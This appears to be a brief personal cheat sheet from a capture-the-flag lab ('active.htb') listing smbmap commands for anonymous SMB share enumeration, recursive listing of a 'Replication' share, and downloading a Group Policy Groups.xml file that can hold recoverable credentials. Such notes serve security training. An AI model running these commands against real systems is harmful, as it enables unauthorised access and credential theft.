Enum
```
smbmap -H 10.10.10.100 -L
smbmap -H 10.10.10.100 -s Replication
smbmap -H 10.10.10.100 -u '' -p '' -r --depth 10
smbmap -H 10.10.10.100 -u '' -p '' --recursive

```

Resurcuivly searcch
```
smbmap -R Replication -H ip
```


Download
```
smbmap -H 10.10.10.100 -u '' -p '' --download 'Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml'  
```


